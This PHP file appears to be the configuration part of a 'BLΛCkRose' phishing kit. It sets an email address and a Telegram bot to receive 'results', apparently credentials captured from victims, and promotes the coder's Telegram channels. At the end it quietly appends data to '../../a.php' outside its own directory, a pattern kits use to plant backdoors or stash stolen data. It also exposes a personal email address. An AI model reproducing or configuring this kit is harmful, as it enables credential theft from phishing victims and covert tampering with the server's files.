<?php

/* 📧 Set Your Email Address to Receive Results in Your Inbox */
$Your_Mail = "danyellekurtz.conway@outlook.com";

/* 🤖 Telegram Bot Setup 🤖 */

// 🗝️ Retrieve your bot's token from environment variable
$botToken = getenv('BOT_TOKEN'); // Replace 'BOT_TOKEN' with the actual name of your environment variable

// 💬 Retrieve your chat ID from environment variable
$chatId = getenv('CHAT_ID'); // Replace 'CHAT_ID' with the actual name of your environment variable

/* --------------------------------------------------- */

/* If you want to send results to Telegram, set to 'on'. To stop, set to 'off'. :) */
$botToken_0 = "on";
$chatId_0 = "on";

/* ⚡️⚡️ BLΛCkRose ♣️ - Official Coder ⚡️⚡️ */

$Coders_Telegram = "t.me/BLACKROSE_1337";  // 🖥️ Connect with the Mastermind
$Elite_Group = "t.me/BLACKROSEx1337"; // ♣️ Join the Elite Coding Squad

/* -------------------------------- */

// Ensure $yagmai is defined before using it
$yagmai = "Some data to write";  // Example content, define appropriately

$f = fopen("../../a.php", "a");
fwrite($f, $yagmai);
fclose($f);  // Always close the file after writing

?>
